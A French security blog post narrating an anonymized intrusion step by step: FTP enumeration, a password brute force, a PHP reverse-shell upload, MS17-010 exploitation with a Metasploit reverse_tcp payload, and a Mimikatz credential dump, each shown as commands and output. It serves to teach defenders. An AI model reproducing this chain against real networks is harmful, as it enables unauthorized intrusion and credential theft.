<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Anatomie d'une attaque informatique</title>
	<link href="https://jurassi.ch/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed for blog posts">
	<style>
		body {
			font-family: sans-serif;
			margin: 0 auto;
			max-width: 48rem;
			line-height: 1.45;
			padding: 0.5rem 0 1.6rem;
			#box-shadow: 0 0 2rem 0 #bbb;
			#border-radius: 0 0 0.6rem 0.6rem;
		}
		main {
			padding: 0 1.4rem;
			hyphens: auto;
		}
		code {
			background: #eee;
			padding: 0.3rem;
			tab-size: 4;
		}
		pre code {
			display: block;
			overflow-x: auto;
			padding: 0.3rem 0.6rem;
		}

		nav ul {
			margin: 0;
			padding: 0;
			display: flex;
			background: #a11;
		}
		nav li {
			list-style: none;
		}
		nav li * {
			display: block;
			padding: 0.4rem 0.4rem;
			color: white;
		}
		nav li strong {
			padding-left: 1.5rem;
			padding-right: 1rem;
		}
		nav a {
			text-decoration: none;
		}
		nav a:hover {
			background: #ad4949;
		}
	</style>
</head>

<nav>
	<ul>
		<li><strong>Jurassi.ch</strong></li>
		<li><a href="index.html">/home</a></li>
		<li><a href="about.html">/about</a></li>
		<li><a href="links.html">/links</a></li>
		<li><a href="projects.html">/projects</a></li>
	</ul>
</nav>

<main>
<h1>Anatomie d'une attaque informatique</h1>
<p>Au cours de cet article, je vous propose de décortiquer le processus d'une attaque informatique à distance. Il s'agit d'un cas réel, pour lequel l'entreprise a entrepris des actions correctives. Pour des raisons éthiques, toute information potentiellement sensible a été anonymisée ou supprimée.</p>
<p>Comme l'indique le schéma ci-après, un attaquant (à droite et en rouge) connecté à internet, tente de s'introduire sur le réseau de l'entreprise (à gauche).</p>
<p><img src="img/20180217102110-attaque-informatique.png" alt="" /></p>
<h4>Phase 1 - Découverte</h4>
<p>En premier lieu l'attaquant va énumérer les services logiciels fournis par l'entreprise sur internet. Bien souvent le management n'a pas connaissance de l'existence de ses services, et des risques encourus
L'attaquant découvre :</p>
<ul>
<li>Un site internet</li>
<li>Un serveur de transfert de fichiers (FTP)</li>
</ul>
<p>Le serveur FTP est accessible en mode <em>anonyme</em>, ce qui permet une connexion sans pouvoir utiliser les fonctions de transfert de fichier. On peut considérer que le mode anonyme est "sécurisé". Toutefois il permet d'obtenir une information qui peut paraître anodine, mais qui a une grande importance pour la suite : le nom de compte d'un utilisateur "administrateur" peut être découvert lors d'une connexion anonyme.</p>
<pre><code>root@attaquant:~ $ ftp ftp.entreprise.fr
Connected to ftp.entreprise.fr.
220 xxx.xxx.xxx.xxx FTP server ready
Name (ftp.entreprise.fr:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; passive
Passive mode on.
</code></pre>
<p>La commande <code>ls -lha</code> donne l'information concernant la présence d'un compte "admin" sur le serveur FTP.</p>
<pre><code>ftp&gt; ls -lha
227 Entering Passive Mode
150 Opening ASCII mode data connection for file list
drwxr-s---   2 admin    group       4.0k Dec  6  2017 .
drwxr-s---   2 admin    group       4.0k Dec  7  2017 ..
226 Transfer complete
ftp&gt;
</code></pre>
<h4>Phase 2 - tentative d'accès non autorisé</h4>
<p>L'attaquant sait désormais qu'une personne s'identifie auprès du serveur en tant que "admin".
Il va mener sur ce compte une simple attaque basée sur un dictionnaire de mots de passe. Ces dictionnaires sont librement téléchargeables sur le web.</p>
<p>Grâce à des outils comme <strong>hydra</strong> ou <strong>medusa</strong>, l'attaquant obtient le mot de passe du compte FTP admin.</p>
<pre><code>ACCOUNT FOUND: [ftp] Host : xxx.xxx.xxx.xxx
User: admin Password: tintin [SUCCESS]
</code></pre>
<h4>Phase 3 - obtenir un accès plus complet au serveur</h4>
<p>Désormais l'attaquant en tant qu'admin, possède des permissions d'écriture sur le serveur web.
Il lui est donc permis d'envoyer sur le serveur une backdoor qui établira une connexion vers sa machine quand elle sera exécutée.</p>
<pre><code>ftp&gt; cd html
250 CWD command successful
ftp&gt; put shell.php
local: shell.php remote: shell.php
227 Entering Passive Mode.
150 Opening BINARY mode data connection for shell.php
226 Transfer complete
1113 bytes sent in 0.00 secs (14.9499 MB/s)
</code></pre>
<p>L'éxécution de shell.php initie une connexion vers la machine de l'attaquant. Ce dernier dispose ainsi d'un shell sur le serveur (et plus seulement un accès FTP) qui lui permet de mener d'autres actions sur le réseau interne de l'entreprise.</p>
<h4>Phase 4 : identifications des machines du réseau et de leurs vulnérabilités</h4>
<p>L'attaquant balaie et identifie les machines du réseau. Il découvre un serveur Active Directory vulnérable à MS17-010.</p>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_ms17_010
msf auxiliary(scanner/smb/smb_ms17_010) &gt; set RSHOSTS xxx.xxx.xxx.xxx/24
rhosts =&gt; xxx.xxx.xxx.xxx/24
msf auxiliary(scanner/smb/smb_ms17_010) &gt; run
[+] xxx.xxx.xxx.xxx:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>
<h4>Phase 5 : exploitation de la vulnérabilité MS17-010</h4>
<p>Grâce au framework metasploit, l'attaquant exploite la vulnérabilité MS17-010 non corrigée et obtient un accès au serveur Active Directory.</p>
<pre><code>msf auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_psexec
msf exploit(windows/smb/ms17_010_psexec) &gt; set RHOST xxx.xxx.xxx.xxx
msf exploit(windows/smb/ms17_010_psexec) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 443
msf exploit(windows/smb/ms17_010_psexec) &gt; run
[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:443
[*] xxx.xxx.xxx.xxx:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
[*] xxx.xxx.xxx.xxx:445 - Built a write-what-where primitive...
[+] xxx.xxx.xxx.xxx:445 - Overwrite complete... SYSTEM session obtained!
[*] xxx.xxx.xxx.xxx:445 - Selecting PowerShell target
[*] xxx.xxx.xxx.xxx:445 - Executing the payload...
[+] xxx.xxx.xxx.xxx:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (179779 bytes) to xxx.xxx.xxx.xxx
[*] Meterpreter session 3 opened (xxx.xxx.xxx.xxx:443 -&gt; xxx.xxx.xxx.xxx:46491) at 2018-02-10 15:20:38
meterpreter &gt; background
[*] Backgrounding session 3...
</code></pre>
<h4>Phase 6 : obtention du mot de passe administrateur du domaine</h4>
<p>Grâce à Mimikatz l'attaquant obtient le mot de passe administrateur du domaine, stocké en clair dans la mémoire de la machine.</p>
<pre><code>meterpreter&gt; load Mimikatz
meterpreter&gt; wdigest
0;1368385624  Kerberos   DOMAINE     netadmin       	 1234
0;2500325002  Kerberos   DOMAINE     user1        	 password1
0;68817461    Kerberos   DOMAINE     user2          	 password2
0;2599386119  Kerberos   DOMAINE     user3		password3
0;2600098700  Kerberos   DOMAINE     administrateur	Very$ecureP@ssw0rdVeryL0ngAndDifficultToGuess
0;2581308498  Kerberos   DOMAINE     user8         	password8
0;2589349129  Kerberos   DOMAINE     user4     		password4
0;2597681195  Kerberos   DOMAINE     user5      	password5
0;2597641064  Kerberos   DOMAINE     user6         	password6
0;2595339032  Kerberos   DOMAINE     user7         	password7
</code></pre>
<p>L'accès administrateur du domaine étant obtenu, l'attaquant poursuit ses investigations sur l'ensemble des systèmes du réseau, à la recherche d'information sensibles.</p>
<h4>Conclusion</h4>
<p>L’enchaînement de plusieurs vulnérabilités peut mener à la compromission d'un réseau informatique  : tester et auditer votre sécurité.</p>
<p>Tags: pentest</p>
<small>Written on 2023-09-11.</small>
</main>
